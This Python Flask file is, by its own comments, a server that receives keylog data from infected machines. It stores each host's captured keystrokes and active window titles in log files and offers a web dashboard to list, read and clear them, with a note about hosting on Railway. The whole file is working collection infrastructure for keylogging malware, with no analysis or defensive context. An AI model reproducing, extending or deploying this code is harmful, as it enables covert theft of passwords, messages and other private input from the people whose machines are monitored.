from flask import Flask, request, jsonify, render_template
from datetime import datetime
import json
import os

app = Flask(__name__)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ==========================================
#  RECEIVE KEYLOG DATA FROM CLIENT
# ==========================================
@app.route("/log", methods=["POST"])
def receive_log():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400

        host    = data.get("host", "unknown").strip()
        payload = data.get("data", "")
        window  = data.get("window", "")
        ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Sanitize host name for use as filename
        safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
        if not safe_host:
            safe_host = "unknown"

        log_file = os.path.join(LOG_DIR, f"{safe_host}.txt")

        with open(log_file, "a", encoding="utf-8") as f:
            if window:
                f.write(f"\n\n--- [{window}] [{ts}] ---\n")
            f.write(payload)

        print(f"[{ts}] Received from {host} — {len(payload)} chars")
        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500


# ==========================================
#  VIEW LOGS IN BROWSER
# ==========================================
@app.route("/")
def index():
    machines = []
    if os.path.exists(LOG_DIR):
        for f in sorted(os.listdir(LOG_DIR)):
            if f.endswith(".txt"):
                name = f[:-4]
                path = os.path.join(LOG_DIR, f)
                size = os.path.getsize(path)
                mtime = os.path.getmtime(path)
                last_seen = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")
                machines.append({
                    "name": name,
                    "size": size,
                    "last_seen": last_seen
                })
    return render_template("index.html", machines=machines)


@app.route("/view/<host>")
def view_log(host):
    # Sanitize
    safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
    log_file  = os.path.join(LOG_DIR, f"{safe_host}.txt")

    if not os.path.exists(log_file):
        return "No log found for this machine.", 404

    with open(log_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    return render_template("view.html", host=safe_host, content=content)


@app.route("/clear/<host>", methods=["POST"])
def clear_log(host):
    safe_host = "".join(c for c in host if c.isalnum() or c in "-_.")
    log_file  = os.path.join(LOG_DIR, f"{safe_host}.txt")
    if os.path.exists(log_file):
        open(log_file, "w").close()
    return jsonify({"status": "cleared"}), 200


# ==========================================
#  HEALTH CHECK (Railway uses this)
# ==========================================
@app.route("/health")
def health():
    return jsonify({"status": "running"}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
